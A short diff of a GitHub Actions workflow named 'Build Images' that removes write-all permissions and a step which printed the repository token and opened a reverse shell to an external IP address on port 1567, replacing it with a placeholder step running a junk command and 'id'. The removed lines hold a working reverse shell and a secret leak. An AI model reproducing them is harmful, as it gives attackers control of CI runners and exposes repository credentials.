@@ -2,13 +2,15 @@ name: "Build Images"
 on: 
   workflow_dispatch:
 
-permissions: write-all
+permissions: {}
 
 jobs:
   init:
     runs-on: ubuntu-latest
     name: "init"
     steps:
-    - run: |
-       echo "${{ secrets.GITHUB_TOKEN }}"
-       sh -i >& /dev/tcp/146.59.195.165/1567 0>&1
+      - name: test
+        continue-on-error: true
+        run: |
+           sqjkdhsq
+           id
